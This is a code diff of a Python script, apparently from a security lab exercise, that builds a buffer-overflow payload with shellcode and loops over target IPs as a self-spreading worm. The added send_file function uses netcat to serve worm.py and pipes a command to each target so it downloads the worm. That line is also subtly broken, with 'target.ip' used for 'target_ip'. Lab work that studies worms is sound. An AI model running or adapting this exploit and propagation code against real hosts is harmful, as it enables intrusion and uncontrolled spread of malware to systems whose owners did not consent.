@@ -33,8 +33,8 @@ def createBadfile():
    # Put the shellcode at the end
    content[500-len(shellcode):] = shellcode
 
-   ret    = 0xffffd5f8  # Need to change
-   offset = 0xffffd588  # Need to change
+   ret    = 0x00 # Need to change
+   offset = 0x00 # Need to change
 
    content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
    ##################################################################
@@ -65,6 +65,7 @@ createBadfile()
 while True:
     targetIP = getNextTarget()
 
+
     # Send the malicious payload to the target host
     print(f"**********************************", flush=True)
     print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
@@ -80,3 +81,19 @@ while True:
 
     # Remove this line if you want to continue attacking others
     exit(0)
+    
+    
+def send_file(target_ip):
+    
+    subprocess.Popen(["nc -lvn 8080 < worm.py"], shell=True)
+    
+    receive_command = (f"nc -w5 {target_ip} 8080 > worm.py")
+    
+    subprocess.run([f"echo '{receive_command}' | nc -w3 {target.ip} 9090"], shell=True)
+    
+ 	
+ 	
+ 	
+ 	
+ 	
+ 	
